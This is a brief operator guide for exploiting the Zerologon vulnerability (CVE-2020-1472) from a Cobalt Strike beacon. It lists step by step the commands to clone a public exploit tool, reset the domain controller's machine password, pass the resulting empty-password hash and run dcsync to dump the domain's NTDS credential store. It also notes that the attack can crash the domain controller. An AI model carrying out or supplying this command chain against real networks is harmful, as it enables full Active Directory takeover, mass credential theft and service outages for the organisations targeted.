# Exploiting CVE-2020-1472 Zerologon in Cobalt Strike

## Clone the Repository

```
> git clone https://github.com/rsmudge/ZeroLogon-BOF
```

Include the script as usual, the destination is `ZeroLogon-BOF/dist/zerologon.cna`.

The console should show a new command - `zerologon`

Application:

Retrieve Domain name (e.g. domain.local)

```
beacon> net domain
```

Run the exploit:

```
beacon> zerologon iunderstand domain.local
```
iunderstand - stop word. By exploiting this vulnerability we reset the password. This exploit can lead to a failure of the domain controller. WE USE IT LAST.

In case of success we get:
Success! Use `pth .\\\%S 31d6cfe0d16ae931b73c59d7e0c089c0` and run `dcscync`.

Do exactly what it says.
```
beacon> pth .\\\%S 31d6cfe0d16ae931b73c59d7e0c089c0
```

And run

```
beacon> dcsync domain.local
```

If everything worked successfully, we get NTDS
